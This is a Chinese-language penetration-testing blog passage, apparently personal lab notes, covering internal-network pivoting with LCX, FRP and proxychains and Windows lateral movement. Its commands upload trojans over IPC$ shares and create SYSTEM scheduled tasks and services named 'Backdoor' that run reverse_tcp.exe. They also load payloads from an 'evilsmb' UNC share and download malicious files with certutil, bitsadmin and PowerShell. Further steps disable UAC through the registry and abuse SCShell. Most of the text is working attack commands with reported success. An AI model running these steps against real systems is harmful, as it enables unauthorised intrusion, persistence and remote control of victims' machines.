<h1 id="常见转发与代理工具"><a href="#常见转发与代理工具" class="headerlink" title="常见转发与代理工具"></a>常见转发与代理工具</h1><h2 id="LCX"><a href="#LCX" class="headerlink" title="LCX"></a>LCX</h2><p>古老的端口转发和端口映射工具</p>
<p>但是不能过杀软+-</p>
<h3 id="目标机有公网IP"><a href="#目标机有公网IP" class="headerlink" title="目标机有公网IP"></a>目标机有公网IP</h3><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/BA8CB706F441202601D65FC20014C6F8.png"  ><span class="image-caption">BA8CB706F441202601D65FC20014C6F8</span></p>
<p>目标机器有公网ip，可以访问</p>
<p>防火墙对3389端口进行了限制</p>
<p>转发到1111端口，需要在目标机器上执行，有些鸡肋</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lcx</span>.exe -tran <span class="hljs-number">1111</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204210911755.png"  ><span class="image-caption">image-20230204210911755</span></p>
<p>然后远程桌面连接</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">192.168.232.136:1111</span><br></code></pre></td></tr></table></figure>



<p>这样就突破了防火墙对3389端口的限制</p>
<h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/19630FEDDF5CE8489293FA0DD3E23236.png"  ><span class="image-caption">19630FEDDF5CE8489293FA0DD3E23236</span></p>
<p>基本模型如图</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">可控的攻击机kali<br><br>公网可以访问的机器wi<span class="hljs-symbol">n10</span><br><br>内网机器wi<span class="hljs-symbol">n7</span><br></code></pre></td></tr></table></figure>

<p>如果现在攻陷了win10，要访问win7，直接访问是不可能的</p>
<p>现在就需要做一个事情叫<font color='red'>端口映射</font></p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">需要将wi<span class="hljs-symbol">n7</span>的端口（比如<span class="hljs-number">1111</span>）映射到wi<span class="hljs-symbol">n10</span>的端口（比如<span class="hljs-number">2222</span>）<br></code></pre></td></tr></table></figure>



<p>需要在win10上执行如下命令</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#将win7的1111端口映射到win10的2222端口</span><br><span class="hljs-attribute">lcx</span>.exe -tran <span class="hljs-number">2222</span> <span class="hljs-number">11.11.11.11</span> <span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>



<p>连接win10的2222端口，即可访问到win7，<font color='red'>前提是拿到win10的ssh凭据</font></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#ssh远程连接</span><br><span class="hljs-attribute">ssh</span> root@<span class="hljs-number">10.10.10.9</span> -p <span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>





<h3 id="目标机器无公网IP"><a href="#目标机器无公网IP" class="headerlink" title="目标机器无公网IP"></a>目标机器无公网IP</h3><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/239A4609017AADF848A8289F083E543E.png"  ><span class="image-caption">239A4609017AADF848A8289F083E543E</span></p>
<p>模型如上</p>
<p>一台不在公网的主机win10，已经被我们攻陷了，现在想要远程桌面连接它</p>
<p>但是不在公网，我们访问不到</p>
<p>这时就需要我们的VPS</p>
<p>首先监听VPS的1111端口，将2222端口的信息发给1111端口</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./lcx</span> <span class="hljs-string">-listen</span> <span class="hljs-number">1111 </span><span class="hljs-number">2222</span><br></code></pre></td></tr></table></figure>



<p>然后在win10主机上执行命令，让win10主机的3389端口转发到VPS的2222端口</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">lcx.exe -slave <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">2222</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>



<p>最后连接VPS的1111端口即可访问win10的远程桌面</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">rdesktop <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">1111</span><br></code></pre></td></tr></table></figure>





<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>FRP反向代理</p>
<p>分为服务端和客户端</p>
<p>支持TCP、UDP、HTTP、HTTPS等协议</p>
<p>支持搭建SOCKS5代理</p>
<p>支持windows系统和linux系统</p>
<p>模型</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/D84E5D6982751303D7DC0BD1F33499E8.png"  ><span class="image-caption">D84E5D6982751303D7DC0BD1F33499E8</span></p>
<h3 id="一级网络代理"><a href="#一级网络代理" class="headerlink" title="一级网络代理"></a>一级网络代理</h3><p>前提是获得了win2008的控制器</p>
<p>即kali与win2008的连接代理</p>
<p><font color='red'>VPS作为FRP的服务端</font></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#启动服务端</span><br>.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>

<p>VPS服务端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>



<p><font color='red'>win2008作为客户端</font></p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#启动客户端</span><br>.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>

<p>客户端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x       <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>          <span class="hljs-comment">#代理使用的端口，会转发到服务端</span><br><span class="hljs-attr">plugin</span> = socks5             <span class="hljs-comment">#代理类型</span><br></code></pre></td></tr></table></figure>



<p>这就成功搭建了VPS与win2008的一个socks5代理</p>
<p><font color='red'>在kali上使用这个代理</font></p>
<p>使用proxychains</p>
<p>配置文件地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>proxychains4.conf<br></code></pre></td></tr></table></figure>

<p>在配置文件最后一行加上</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">socks<span class="hljs-number">5</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204231303622.png"  ><span class="image-caption">image-20230204231303622</span></p>
<p>在命令之前加上proxychains，就可以使用代理</p>
<h3 id="二级网络代理"><a href="#二级网络代理" class="headerlink" title="二级网络代理"></a>二级网络代理</h3><p>当我们拿到win2012的权限之后，发现还存在192.168.10.0/24这个网段</p>
<p>需要搭建一个隧道才能访问，工作区</p>
<p>首先还是vps启动服务端</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#启动服务端</span><br>.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br></code></pre></td></tr></table></figure>

<p>vps服务端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>



<p>在win2008执行客户端</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#启动客户端</span><br>.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>

<p>win2008客户端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x       <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5_foward]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">1111</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>          <span class="hljs-comment">#代理使用的端口，会转发到服务端</span><br></code></pre></td></tr></table></figure>



<p>在win2008作为服务端</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\frps.exe</span> -c .<span class="hljs-string">\frps.ini</span><br></code></pre></td></tr></table></figure>

<p>服务端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>      <span class="hljs-comment">#服务端绑定的ip地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span>             <span class="hljs-comment">#服务端绑定的端口</span><br></code></pre></td></tr></table></figure>





<p>在win2012上执行客户端</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\frpc.exe</span> -c .<span class="hljs-string">\frpc.ini</span><br></code></pre></td></tr></table></figure>

<p>客户端配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span>   <span class="hljs-comment">#服务端地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>          <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1111</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure>





<h3 id="三级网络代理"><a href="#三级网络代理" class="headerlink" title="三级网络代理"></a>三级网络代理</h3><p>同上</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>端口转发</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>win to win横向</title>
    <url>/2023/03/02/win%20to%20win%E6%A8%AA%E5%90%91/</url>
    <content><![CDATA[<h1 id="横向移动中如何文件传输"><a href="#横向移动中如何文件传输" class="headerlink" title="横向移动中如何文件传输"></a>横向移动中如何文件传输</h1><p>对目标机器的文件进行读取、下载、上传</p>
<h2 id="网络共享"><a href="#网络共享" class="headerlink" title="网络共享"></a>网络共享</h2><p>windows的网络共享功能，可以实现局域网内机器之间的网络共享</p>
<p>提供相关的认证凭据，就可以实现文件共享</p>
<p>windows默认的文件共享包括，<font color='red'>C、D、E…..这些磁盘、ADMIN系统目录、IPC（满足进程之间的通信）</font></p>
<p>查看共享文件</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230117180044802.png"  ><span class="image-caption">image-20230117180044802</span></p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>我们主要用到的就是IPC共享</p>
<p>建立IPC共享的条件</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">开放<span class="hljs-number">139</span>端口    <span class="hljs-meta">#用于共享文件、打印机</span><br><br>开放<span class="hljs-number">445</span>端口     <span class="hljs-meta">#共享文件、打印机</span><br><br>关闭防火墙    <span class="hljs-meta">#有待证明，下面有讲到</span><br></code></pre></td></tr></table></figure>



<p>建立IPC连接</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\ip地址\<span class="hljs-title class_">IPC</span><span class="hljs-variable">$ </span><span class="hljs-string">&quot;密码&quot;</span> /<span class="hljs-symbol">user:</span><span class="hljs-string">&quot;用户名&quot;</span><br></code></pre></td></tr></table></figure>



<p>查看C盘文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\ip地址\C<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<p>如果对方仅仅只开启了IPC文件共享，那么建立IPC连接是可以成功的，但是无法访问文件</p>
<p>连接成功之后就可以上传木马，将本机的木马上传到对方的C盘</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">copy C:<span class="hljs-string">\Users\wo\Desktop\hobbyhorse_x64.exe</span> <span class="hljs-string">\\192.168.232.132\C$</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230117183445671.png"  ><span class="image-caption">image-20230117183445671</span></p>
<p>然后提供创建计划任务或者其他方法来执行文件</p>
<p>计划任务</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;计划名字&quot;</span> <span class="hljs-string">/tr</span> c:\artifact.exe（执行的进程的绝对路径） <span class="hljs-string">/sc</span> once <span class="hljs-string">/st</span> 16<span class="hljs-function">:11</span>（时间） <span class="hljs-string">/s</span> 192.168.10.8 <span class="hljs-string">/RU</span> System<br></code></pre></td></tr></table></figure>

<p>然后就会返回shell</p>
<h3 id="常用的IPC命令"><a href="#常用的IPC命令" class="headerlink" title="常用的IPC命令"></a>常用的IPC命令</h3><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">查看开启的共享<br><span class="hljs-keyword">net</span> share<br> <br>删除某个共享<br><span class="hljs-keyword">net</span> share c$ /del<br> <br>恢复共享<br><span class="hljs-keyword">net</span> share c$=c:<br> <br>建立共享连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.52.143\c$ 123.com  /user:administrator<br> <br>使用域账号建立共享连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.52.143\c$ 域账户密码  /user:域名\域账户<br> <br>查看本机已建立的共享<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br> <br>查看远程主机的文件<br><span class="hljs-keyword">dir</span> \\192.168.52.143\c$<br><span class="hljs-keyword">dir</span> \\192.168.52.143\c$\xx文件夹<br> <br>复制文件到主机c盘下<br><span class="hljs-keyword">copy</span>  文件名  \\ip\c$<br> <br>删除本机所有已建立的连接 <br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> * /del /y<br> <br>将c盘映射到本地自定义z盘<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: \\ip\c$<br> <br>删除映射的磁盘<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: /del<br></code></pre></td></tr></table></figure>





<h2 id="SMB服务器"><a href="#SMB服务器" class="headerlink" title="SMB服务器"></a>SMB服务器</h2><p>SMB服务</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">SMB服务主要功能是<br>共享   文件、打印机、串行端口、通新   等资源<br></code></pre></td></tr></table></figure>



<p>在自己的服务器上，搭建SMB服务</p>
<p>然后将要传输的文件，放到SMB的共享目录，并且指定UNC路径</p>
<p>需要<font color='red'>开启SMB匿名共享</font></p>
<p>然后让目标机器远程加载</p>
<p>利用impacket工具包开启</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/root/</span>share                <span class="hljs-comment">#创建共享目录</span><br>python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support     <span class="hljs-comment">#创建名为evilsmb的匿名共享</span><br></code></pre></td></tr></table></figure>





<h2 id="windows自带工具"><a href="#windows自带工具" class="headerlink" title="windows自带工具"></a>windows自带工具</h2><p>Windows自带的一些工具也是可以进行文件传输的</p>
<p>都是通过下载服务器上面布置的恶意文件，到本地目录下</p>
<h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p>是一款Windows管理证书的工具，作为证书服务的一部分安装</p>
<p><font color='red'>支持从网络中下载文件的功能</font></p>
<p>思路：在目标机器上面执行certutil命令，进行下载服务器上面预先设置的木马文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">certutil <span class="hljs-literal">-urlcache</span> <span class="hljs-operator">-split</span> <span class="hljs-operator">-f</span> 服务器地址 + 保存的地址目录<br></code></pre></td></tr></table></figure>





<h3 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h3><p>win7以后的系统自带bitsadmin工具</p>
<p>用于创建、下载、上传作业</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">bitsadmin /transfer <span class="hljs-built_in">test</span> 地址 保存目录<br></code></pre></td></tr></table></figure>





<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>这个工具就比较熟悉了</p>
<p>通过创建webclient对象，来实现下载文件</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;地址&#x27;</span>,<span class="hljs-string">&#x27;保存地址&#x27;</span>)<br></code></pre></td></tr></table></figure>







<h1 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h1><p>在有目标机管理员凭据的前提下，可以使用计划任务</p>
<p>首先建立IPC连接</p>
<p>然后利用IPC连接，来上传木马</p>
<p>最后创建计划任务，来执行木马</p>
<p>命令</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U Administrator /</span>p admin123<br></code></pre></td></tr></table></figure>

<p>/U    /P是在没有建立IPC连接的情况下使用的</p>
<p>/S：指定要连接的系统</p>
<p>/TN：指定要创建的计划任务的名称</p>
<p>/SC：指定计划任务执行频率</p>
<p>/MO：指定计划任务执行周期</p>
<p>/TR：指定计划任务运行的程序路径</p>
<p>/RU：指定计划任务运行的用户权限</p>
<p>/F：如果指定的任务已经存在，则强制创建</p>
<p>然后可以直接执行计划</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/RUN /</span>S ip地址 <span class="hljs-regexp">/I /</span>TN Backdoor<br></code></pre></td></tr></table></figure>



<p>也可以通过计划任务来执行主机命令，并且保存结果，然后远程读取</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR :<span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c &#x27;whoami &gt; C:\result.txt&#x27;&quot;</span> <span class="hljs-regexp">/RU System /</span>f<br><br>type \\ip地址\C$\result.txt<br></code></pre></td></tr></table></figure>



<p>删除计划</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Delete /</span>S ip地址 <span class="hljs-regexp">/TN Backdoor /</span>F<br></code></pre></td></tr></table></figure>



<p>还有一种创建计划任务的方式就是at</p>
<p><font color='red'>在小于win2012使用，schtasks是在高版本的windows使用的</font></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\add.bat<br></code></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">2</span> /delete           #<span class="hljs-number">2</span>是计划任务的id<br></code></pre></td></tr></table></figure>





<h2 id="实操失败"><a href="#实操失败" class="headerlink" title="实操失败"></a>实操失败</h2><p>攻击机win10</p>
<p>目标机win7    win2008</p>
<p>目标机是域用户</p>
<p>我在win10上面向win7用schtasks写入计划任务无法成功</p>
<p>一直显示拒绝访问</p>
<p>但是IPC可以正常连接，并且正常访问</p>
<p>用at写入命令就可以正常执行</p>
<p>解决方法如下</p>
<h2 id="实操成功"><a href="#实操成功" class="headerlink" title="实操成功"></a>实操成功</h2><p>上面的问题已经解决</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F     <span class="hljs-comment">#未加凭据</span><br><br>schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U Administrator /</span>p admin123                <span class="hljs-comment">#加上凭据</span><br></code></pre></td></tr></table></figure>



<p>书上说，建立ipc连接之后，是不需要加凭据的</p>
<p>但是</p>
<p>实操是需要加上凭据的，不然一直报错</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202124326341.png"  ><span class="image-caption">image-20230202124326341</span></p>
<p><strong><font color='red'>主要是，目标机器会开启UAC，此时就无法执行计划任务</font></strong></p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System    #路径下的EnableLUA参数，修改为<span class="hljs-number">0</span>，即关闭UAC<br></code></pre></td></tr></table></figure>

<p>但是</p>
<p><strong><font color='red'>只要是administrator用户登陆，是否开启UAC，毫无影响</font></strong></p>
<h2 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h2><p>我们一般的思路都是尝试尽可能的把payload<font color='red'>上传</font>到目标机，但是过程肯定是有些艰难的</p>
<p>还有一个思路就是远程执行</p>
<h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript">\\servername\sharename\directory\filename                其中servername是服务器名、sharename是共享资源的名称、后面就是文件夹和文件<br></code></pre></td></tr></table></figure>

<p>简而言之就是网络上的资源，并不是本地资源</p>
<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>比较简单，就是利用UNC路径加载远程资源</p>
<p>自己搭建一个SMB服务器，并且上传payload，SMB需要设置匿名共享</p>
<p>然后创建计划任务，使用UNC加载远程服务器上的payload</p>
<p>kali为smb服务端</p>
<p>kali linux 为msf监听端</p>
<p>win10为已经攻陷的主机</p>
<p>win7为另外一台待横向主机</p>
<p><font color='red'>配置smb服务端</font></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/root/</span>share                <span class="hljs-comment">#创建共享目录</span><br>python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support     <span class="hljs-comment">#创建名为evilsmb的匿名共享</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202131446915.png"  ><span class="image-caption">image-20230202131446915</span></p>
<p>记得把木马文件放到 /root/share文件夹</p>
<p><font color='cornflowerblue'>配置监听</font></p>
<p>msf开启监听</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202131604093.png"  ><span class="image-caption">image-20230202131604093</span></p>
<p><font color='orange'>win10操作</font></p>
<p>创建计划任务</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.128</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.152</span>\evilsmb\hobbyhorse_x64.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U liukaifeng01 /</span>P admin                    <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202132027206.png"  ><span class="image-caption">image-20230202132027206</span></p>
<p>之后发现主机上线</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202132101178.png"  ><span class="image-caption">image-20230202132101178</span></p>
<p>成功</p>
<h1 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h1><h2 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h2><p>个人觉得和创建计划任务差不多</p>
<p><font color='red'>建立共享连接，向远程主机上传攻击载荷</font></p>
<p><font color='cornflowerblue'>利用已经建立的ipc连接，来创建系统服务</font></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">232</span>.<span class="hljs-number">128</span> create <span class="hljs-keyword">Backdoor </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;cmd.exe /k E:\hobbyhorse_x64.exe&quot;</span><br></code></pre></td></tr></table></figure>



<p><font color='orange'>启动创建的服务</font></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sc</span> \\<span class="hljs-number">192.168.232.128</span> start Backdoor<br></code></pre></td></tr></table></figure>

<p>命令执行之后，会显示失败</p>
<p>但是</p>
<p>没关系，还是执行了服务</p>
<p><font color='red'>删除服务</font></p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">sc <span class="hljs-string">\\192.168.232.128</span> <span class="hljs-keyword">delete</span> Backdoor<br></code></pre></td></tr></table></figure>







<h2 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h2><p>地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SpiderLabs/</span>SCShell<br></code></pre></td></tr></table></figure>



<p>SCShell是一款无文件横向移动工具</p>
<p>需要知道远程主机的管理员凭据和已知的服务</p>
<p>原理</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">通过修改远程主机的服务配置<br><br>将已知服务的二进制路径名修改为指定的程序或者攻击载荷，然后重启服务，攻击之后会将修改的路径自动恢复<br></code></pre></td></tr></table></figure>



<p>格式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">SCShell.exe <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">domain</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scshell.exe </span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">232</span>.<span class="hljs-number">135</span> defragsvc <span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c echo &#x27; hello&#x27; &gt; c:\windows\temp\hello.txt&quot;</span> administrator admin            <span class="hljs-comment">#测试写入文件</span><br></code></pre></td></tr></table></figure>







